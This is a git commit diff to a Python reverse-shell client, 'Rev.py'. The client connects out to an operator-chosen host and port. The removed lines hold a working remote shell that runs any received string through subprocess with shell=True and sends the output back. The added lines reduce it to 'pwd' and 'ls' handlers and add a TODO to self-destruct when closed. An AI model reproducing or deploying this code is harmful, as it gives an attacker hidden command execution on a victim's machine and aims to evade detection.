abbc927bebaf77f0083bc10a8b23c8115727a6af
cl3tu5 <53231555+CletusG@users.noreply.github.com>
2020-09-06 10:47:51 -0400

    Upgrading
    adding download and more features soon

--- Linux/Rev.py
+++ Linux/Rev.py
@@ -8,20 +8,20 @@ port = int(input("Port: "))
 s.connect((host, port))
 
 while True:
-	# increase bytes
-	data = s.recv(2048)
-	# if first 2 characters are cd, change dir to next characters
-	# note the :2 is before and the 3: is after
-	if data[:2].decode("utf-8") == "cd":
-		os.chdir(data[3:].decode("utf-8"))
-	if len(data) > 0:
-		# process open
-		# play around with shell
-		cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-		output_bytes = cmd.stdout.read() + cmd.stderr.read()
-		output_str = str(output_bytes, "utf-8")
-		s.send(str.encode(output_str + str(os.getcwd()) + ' $ '))
-		#print(output_str)
+	command = s.recv(10000)
+	command = command.decode()
+	if command == "pwd":
+		files = os.getcwd()
+		files = str(files)
+		s.send(files.encode())
+	elif command == "ls":
+		cwd = str(os.listdir())
+		s.send(cwd.encode())
+	else:
+		msg = str("[☠] Unkown command")
+		s.send(msg.encode())
+
+## TODO: Self destruct when closed
 
 # Close the connection
 
